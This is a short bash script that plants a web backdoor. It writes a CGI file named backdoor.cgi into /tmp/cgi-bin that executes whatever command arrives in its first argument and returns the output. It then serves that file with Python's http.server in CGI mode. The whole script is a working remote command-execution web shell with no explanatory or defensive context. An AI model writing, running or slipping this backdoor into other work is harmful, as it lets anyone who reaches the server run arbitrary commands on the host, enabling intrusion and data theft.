#!/bin/bash

cd /tmp
mkdir cgi-bin
echo '#!/bin/bash' > ./cgi-bin/backdoor.cgi
echo 'echo -e "Content-Type: text/plain\n\n"' >> ./cgi-bin/backdoor.cgi
echo 'echo -e $($1)' >> ./cgi-bin/backdoor.cgi
chmod +x ./cgi-bin/backdoor.cgi 
python -m http.server --cgi
